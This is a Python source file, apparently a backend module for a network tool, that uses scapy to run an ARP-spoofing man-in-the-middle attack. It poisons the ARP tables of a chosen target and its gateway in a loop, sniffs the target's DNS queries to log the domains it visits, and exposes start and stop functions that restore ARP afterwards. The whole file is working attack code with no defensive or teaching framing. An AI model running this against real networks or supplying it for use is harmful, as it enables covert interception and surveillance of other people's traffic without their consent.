import threading
import time
from scapy.all import ARP, Ether, sendp, AsyncSniffer, IP, DNS

# ========== Global MITM State ==========
mitm_running = False
mitm_thread = None
sniffer = None
log_buffer = []
log_lock = threading.Lock()
stop_event = threading.Event()
seen_queries = {}

# ========== ARP Spoofing ==========
def spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    sendp(packet, verbose=False)

def restore(dest_ip, src_ip, dest_mac, src_mac):
    packet = Ether(dst=dest_mac) / ARP(op=2, pdst=dest_ip, psrc=src_ip, hwdst=dest_mac, hwsrc=src_mac)
    sendp(packet, count=4, verbose=False)

# ========== DNS Sniffer ==========
def dns_sniffer(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # DNS query
        ip_src = packet[IP].src
        domain = packet[DNS].qd.qname.decode('utf-8', errors='ignore')
        key = (ip_src, domain)
        now = time.time()

        if key not in seen_queries or now - seen_queries[key] > 10:
            seen_queries[key] = now
            log = f"[DNS] {ip_src} queried {domain}"
            with log_lock:
                log_buffer.append(log)
                if len(log_buffer) > 100:
                    log_buffer.pop(0)

# ========== Main Spoof Loop ==========
def arp_spoof_loop(target_ip, target_mac, gateway_ip, gateway_mac):
    try:
        while not stop_event.is_set():
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    finally:
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)

# ========== Public API ==========
def start_attack(*, target_ip, target_mac, gateway_ip, gateway_mac):
    global mitm_running, mitm_thread, sniffer

    if mitm_running:
        return

    stop_event.clear()

    mitm_thread = threading.Thread(
        target=arp_spoof_loop,
        args=(target_ip, target_mac, gateway_ip, gateway_mac),
        daemon=True
    )
    mitm_thread.start()

    sniffer = AsyncSniffer(filter="udp port 53", prn=dns_sniffer, store=False)
    sniffer.start()

    mitm_running = True
    with log_lock:
        log_buffer.append("[+] MITM attack started")


def stop_attack():
    global mitm_running, sniffer, mitm_thread

    if not mitm_running:
        return

    stop_event.set()

    if mitm_thread and mitm_thread.is_alive():
        mitm_thread.join()

    if sniffer:
        sniffer.stop()

    mitm_running = False
    with log_lock:
        log_buffer.append("[!] MITM attack stopped and ARP restored")

def get_logs():
    with log_lock:
        return list(log_buffer)
